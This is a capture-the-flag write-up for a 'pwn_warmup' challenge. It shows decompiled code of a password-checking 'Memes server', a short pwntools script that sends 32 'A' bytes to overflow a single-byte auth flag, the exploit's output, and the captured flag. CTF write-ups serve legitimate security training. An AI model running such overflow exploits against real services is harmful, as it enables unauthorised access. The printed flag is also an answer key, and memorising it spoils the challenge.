
# pwn_warmup

### Question

<img width="492" alt="Screen Shot 2019-03-10 at 7 35 40 PM" src="https://user-images.githubusercontent.com/14992494/54084578-6fefe600-436d-11e9-9bfb-9f578f51f833.png">

### Solution

<img width="674" alt="Screen Shot 2019-03-10 at 7 45 02 PM" src="https://user-images.githubusercontent.com/14992494/54084579-6fefe600-436d-11e9-985c-5a4b8818585a.png">

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  ssize_t sVar1;
  int iVar2;
  undefined local_31 [32];
  char local_11;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_11 = 1;
  puts("Memes server");
  printf("Enter the password: ");
  fflush(stdout);
  sVar1 = read(0,local_31,0x20);
  local_31[sVar1] = 0;
  iVar2 = auth(local_31);
  if (iVar2 != 0) {
    local_11 = 0;
  }
  if (local_11 == 0) {
    readMeme();
  }
  else {
    puts("[-] Auth error!");
  }
  return 0xffffffff;
}
```

```
root@kali:~/Desktop# cat meme_server_ex.py 
from pwn import *

ip = "185.66.87.233"
port = "5004"

p = remote(ip, port)

p.sendline("A"*32)

p.interactive()
root@kali:~/Desktop# python meme_server_ex.py 
[+] Opening connection to 185.66.87.233 on port 5004: Done
[*] Switching to interactive mode
Memes server
Enter the password: here is your meme: Aero{d31d0c1f564273c9bf3f1d1e1540c100}
[*] Got EOF while reading in interactive
$  
```

### Flag

Aero{d31d0c1f564273c9bf3f1d1e1540c100}
